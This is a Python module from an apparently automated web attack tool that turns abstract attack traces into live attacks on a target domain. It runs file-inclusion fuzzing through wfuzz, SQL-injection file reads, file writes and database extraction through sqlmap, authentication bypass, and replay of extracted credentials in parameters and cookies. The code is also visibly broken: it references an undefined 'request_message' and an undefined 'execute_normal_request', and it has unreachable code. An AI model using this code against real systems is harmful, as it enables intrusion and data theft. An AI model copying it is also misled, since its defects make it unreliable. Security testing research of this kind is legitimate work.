#!/usr/local/bin/python3.5

"""
This module executes a trace
"""

import os
import re
import json
import config
import parser
import atexit
import requests
import linecache
import threading
import itertools
import modules.wrapper.sqlmap as sqlmap

from modules.logger import logger
# disable warnings when making unverified HTTPS requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from modules.filesystem.traversalengine import execute_traversal
from modules.filesystem.fs import payloadgenerator
from modules.filesystem.fs import execute_wfuzz
from modules.sqli.sqli import sqlmap_parse_data_extracted
from modules.sqli.sqli import execute_sqlmap
from modules.sqli.sqli import execute_bypass
from modules.sqli.sqli import get_list_extracted_files
from modules.http import execute_request
from os.path import isfile, join, expanduser, dirname, realpath
from os import listdir


# global request
s = None

# global attack domain
attack_domain = ""

# specific for executing sqlmap
data_to_extract = []

def exitcleanup():
    logger.debug("exiting "+__name__)

# takes an attack trace and an extension matrix, and execute the attack
def execute_attack(msc_table,concretization_json,file_aslanpp):
    global s
    global attack_domain
    logger.info("Executing the attack trace")


    atexit.register(exitcleanup)

    # general fields for sperforming an HTTP request
    url = None
    method = None
    params = None
    mapping = None
    abstract_param_to_real = None

    # web application's output
    sqlmap_output = None
    files_output = []

    # request session object for performing subsequent HTTP requests
    s = requests.Session()

    # current response
    response = None

    # load the concretization file
    with open(config.concretization,"r") as data_file:
         concretization_data = json.load(data_file)
         data_file.close()
    attack_domain = concretization_data["domain"]

    __got_cookie = False

    # loop the msc_table, the main execution loop
    for idx, row in enumerate(msc_table):
        if "<i" in row[1][0]:
            # intruder step
            tag = row[0]
            m = row[1]
            sender = m[0]
            receiver = m[1]
            message = m[2]
            logger.debug(message)
            concretization_details = concretization_json[tag]
            attack = concretization_details["attack"]
            params = None
            try:
                params = concretization_details["params"]
            except KeyError:
                pass

            # if we have the keep-cookie option, we make a first empty request to
            # get the initial set-cookie
            # TODO: this request should be improved considering also the
            # parameters and the cookies
            if config.keep_cookie and not __got_cookie:
               #msc_table[
               logger.debug("executing first request for getting cookie")
               first_request = {}
               first_request["url"] = concretization_data[tag]["url"]
               first_request["method"] = concretization_data[tag]["method"]
               r = execute_request(s,first_request)
               s.cookies.clear()
               config.cookies = r.cookies
               __got_cookie = True


            # continue?
            logger.info(row[1])
            c = __ask_yes_no("Executing step, continue?")
            if not c:
                exit(0)

            # start populating the structure used performing attacks\requests
            req = {}
            req["url"] = concretization_data[tag]["url"]
            req["method"] = concretization_data[tag]["method"]
            # now create the params
            req_params = {}
            for k,v in concretization_data[tag]["params"].items():
                tmp = v.split("=")
                req_params[tmp[0]] = tmp[1]
            req["params"] = req_params

            # filesystem inclusion
            if attack == 4:
                logger.info("File reading attack")
                logger.debug("execute attack on param")
                logger.debug(params)
                # TODO: the next two lines are really bad
                pages = msc_table[idx+1][1][2].split(".")
                # baaad, we assume that position 0 is always the page we're looking for
                check = concretization_data[pages[0]]

                read_file, search = __get_file_to_read(message,concretization_data)
                logger.debug("filesystem inclusion: \"" + read_file + "\" we're looking for: \"" + search + "\"" )
                payloads = payloadgenerator(read_file)
                logger.debug("payloads generated: " + str(payloads))
                req["payloads"] = payloads
                req["ss"] = search
                wfuzz_output = execute_wfuzz(req)
                if len(wfuzz_output) > 0:
                    # we successfully found something, write it on files and show them to the
                    # user. Save the file in a local structure so that they can be used in further
                    # requests
                    logger.info("writing local files")
                    for finc in wfuzz_output:
                        url = finc["url"]
                        # I should make a request and retrieve the page again
                        req["url"] = url
                        if len(finc["postdata"]) > 0:
                            req["method"] = "post"
                        req["params"] = {}
                        for k,v in finc["postdata"].items():
                            req["params"][k] = v
                        response = execute_request(s,req)
                        pathname = url.replace("http://","").replace("https://","").replace("/","_")
                        filepath = os.path.join(".",pathname)
                        f = open(filepath,"w")
                        f.write(response.text)
                        f.close()
                        files_output.append(filepath)
                        logger.info(filepath)
                    logger.debug(files_output)
                    logger.info("files have been written")
                    pass
                else:
                    # we couldn't find anything, abort execution
                    logger.critical("File inclusion did not succeed")
                    exit()
                continue


            # SQL-injection filesystem READ
            if attack == 1:
                logger.info("SQLI Filesystem read attack!")
                real_file_to_read = __get_file_to_read(message, concretization_data)
                logger.info("file to read: " + real_file_to_read)
                req["read"] = real_file_to_read
                execute_sqlmap(req)

                # extracted files can be found in ~/.sqlmap/output/<attacked_domani>/files/
                # list extracted file content
                get_list_extracted_files(attack_domain)
                continue

            # SQL-injection filesystem WRITE
            if attack == 2:
                abstract_evil_file = re.search(r'sqli\.([a-zA-Z_]*)',request_message).group(1)
                real_evil_file = concretization_data["files"][abstract_evil_file]
                logger.debug("file to write: " + real_evil_file)

                req["write"] = real_evil_file
                execute_sqlmap(req)
                continue


            # SQL-injection
            if attack == 0:
                # data extraction
                logger.debug(params)
                if params != None:
                   logger.info("Data extraction attack!")

                   # get the table and columns to be enumarated
                   extract = []
                   exploitations = concretization_details["params"]
                   logger.debug("Exploitations")
                   logger.debug(exploitations)
                   for i,tag2 in enumerate(exploitations):
                         exploit_points = exploitations[tag2]
                         for k in exploit_points:
                             try:
                                 tmp_map = concretization_data[tag2]["params"][k].split("=")[0]
                             except KeyError:
                                 tmp_map = concretization_data[tag2]["cookies"][k].split("=")[0]
                             tmp_table = concretization_data[tag2]["tables"][tmp_map]
                             extract.append(tmp_table)

                   req["extract"] = extract
                   # for the execution we need (url,method,params,data_to_extract)
                   # data_to_extract => table.column
                   # sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
                   output = execute_sqlmap(req)
                   sqlmap_output = sqlmap_parse_data_extracted(output)
                   logger.debug(sqlmap_output)
                   if not sqlmap_output:
                       logger.warning("No data extracted from the database")
                       exit()
                # authentication bypass
                else:
                   logger.info("Authentication bypass attack!")
                   req = {}
                   req["url"] = concretization_data[tag]["url"]
                   req["method"] = concretization_data[tag]["method"]
                   # now create the params
                   params = {}
                   for k,v in concretization_data[tag]["params"].items():
                       tmp = v.split("=")
                       params[tmp[0]] = tmp[1]
                   req["params"] = params

                   pages = msc_table[idx+1][1][2].split(".")
                   check = concretization_data[pages[0]] # baaad, we assume that position 0 is always the page we're looking for
                   is_bypassed = execute_bypass(s,req,check)
                   if is_bypassed:
                       logger.info("bypass succeeded")
                   else:
                       logger.info("bypass error, abort execution")
                       exit(0)

            # exploit the sqli here, which is also a normal request where we use
            # the result from sqlmap
            elif attack == 6:
                logger.debug("exploit sqli here, crafted request")

                req = {}
                req["url"] = concretization_data[tag]["url"]
                req["method"] = concretization_data[tag]["method"]
                # generate all possible combination of parameters to try
                params = {}
                req_params = []
                for k,v in concretization_data[tag]["params"].items():
                    tmp = v.split("=")
                    param_pair = []
                    if tmp[1] == "?":
                       # we need to provide something from the output of sqlmap
                       table = concretization_data[tag]["tables"][tmp[0]].split(".")
                       for v in sqlmap_output[table[0]][table[1]]:
                           param_pair.append(tmp[0]+"="+v)
                       logger.debug(param_pair)
                       req_params.append(param_pair)
                       logger.debug(req_params)
                    else:
                        param_pair.append(tmp[0] + "=" + tmp[1])
                        req_params.append(param_pair)

                # generate all possible combination of cookies to try
                cookies = {}
                req_cookies = []
                try:
                    for k,v in concretization_data[tag]["cookies"].items():
                        tmp = v.split("=")
                        cookies_pair = []
                        if tmp[1] == "?":
                           # we need to provide something from sqlmap output
                           table = concretization_data[tag]["tables"][tmp[0]].split(".")
                           for v in sqlmap_output[table[0]][table[1]]:
                               cookies_pair.append(tmp[0]+"="+v)
                           logger.debug(cookies_pair)
                           req_cookies.append(cookies_pair)
                           logger.debug(req_cookies)
                        else:
                            cookies_pair.append(tmp[0] + "=" + tmp[1])
                            req_cookies.append(cookies_pair)
                except KeyError:
                    pass
                logger.debug(req)
                # I used the %26 (encode of &) because it might happen that the password has a &
                # and when I split, I split wrong
                params_perm = []
                cookies_perm = []
                if len(req_params) > 0:
                    params_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_params)]
                if len(req_cookies) > 0:
                    cookies_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_cookies)]
                logger.debug("params perm")
                logger.debug(params_perm)
                logger.debug("cookies perm")
                logger.debug(cookies_perm)

                found = False
                # loop on all the possibile params and cookies combination and try to exploit the result
                if len(params_perm) == 0 and len(cookies_perm) > 0:
                    # we only have cookies
                    for header in cookies_perm:
                        if not found:
                            logger.debug("Attempt to exploit sqli")
                            logger.debug(header)
                            req["cookies"] = dict( item.split("=") for item in header.split("%26") )
                            response = execute_request(s,req)
                            found = __check_response(idx,msc_table,concretization_data,response)
                elif len(params_perm) > 0 and len(cookies_perm) == 0:
                    # we only have params
                    for param in params_perm:
                        if not found:
                            logger.debug("Attempt to exploit sqli")
                            logger.debug(param)
                            req["params"] = dict( item.split("=") for item in param.split("%26") )
                            response = execute_request(s,req)
                            found = __check_response(idx,msc_table,concretization_data,response)
                elif len(params_perm) > 0 and len(cookies_perm) > 0:
                    # we have params and cookies values
                    for param in params_perm:
                        req["params"] = dict( item.split("=") for item in param.split("%26") )
                        for header in cookies_perm:
                            if not found:
                                logger.debug("Attempt to exploit sqli")
                                logger.debug(param)
                                req["cookies"] = dict( item.split("=") for item in header.split("%26") )
                                response = execute_request(s,req)
                                found = __check_response(idx,msc_table,concretization_data,response)

                if not found:
                    # we coulan'td procede in the trace, abort
                    logger.warning("Exploitation failed, abort trace execution")
                    exit(0)
                else:
                    logger.info("Exploitation succceded")

            # normal http request
            elif attack == -1:
                logger.debug(msc_table[idx][0])

                req = {}
                req["url"] = concretization_data[tag]["url"]
                req["method"] = concretization_data[tag]["method"]
                # now create the params
                params = {}
                for k,v in concretization_data[tag]["params"].items():
                    tmp = v.split("=")
                    # check if the value of parameters is ?
                    params[tmp[0]] = tmp[1]
                req["params"] = params
                response = execute_request(s,req)
                # check if reponse is valid
                # by reading the constant from the msc response
                pages = msc_table[idx+1][1][2].split(".")
                logger.debug("check pages")
                logger.debug(pages)
                for p in pages:
                        logger.debug(concretization_data[p])
                        if response == None or not( concretization_data[p] in response.text):
                           logger.warning("Exploitation failed, abort trace execution")
                           exit(0)
                        else:
                           logger.info("Step succceded")
    logger.info("Trace ended")


def __get_file_to_read(message, concretization_data):
    real_file_to_retrieve = ""
    if "path_injection" in message:
        # it means we prompt the user for the filename
        real_file_to_retrieve = input("Which file yuo want to read?")
    else:
        # get the name of the file to retrieve from the concretization file
        abstract_file_to_retrieve = re.search(r'sqli\.([a-zA-Z]*)',message).group(1)
        real_file_to_retrieve = concretization_data["files"][abstract_file_to_retrieve]
        # and ask the user if it's ok
        c = __ask_yes_no("The file that will be read is: " + real_file_to_retrieve + ", are you sure?")
        if not c:
            # ask the user which file to retrieve
            real_file_to_retrieve = input("Which file you want to read?")
    # TODO: ask what regexp we should be looking for
    search = input("What are you looking for?")
    return real_file_to_retrieve, search

def __check_response(idx,msc_table,concretization_data,response):
    pages = msc_table[idx+1][1][2].split(".")
    for p in pages:
           logger.debug(concretization_data[p])
           try:
                   if response != None and concretization_data[p] in response.text:
                       logger.debug("valid request")
                       logger.debug(concretization_data[p])
                       return True
                       break;
           except Exception:
                    return False
                    logger.debug("NO ")
    return False


def __ask_yes_no(msg,default="y"):
    prompt = " [Y/n]"
    ret = True
    if default == "n":
        prompt = " [n/Y]"
        ret = False
    s = input(msg + prompt)
    if s == "":
        return ret
    if s == "Y" or s == "y":
        return True
    elif s == "N" or s == "n":
        return False
    else:
        print("Invalid input");
        return __ask_yes_no(msg,default)


if __name__ == "__main__":
    execute_normal_request("c")

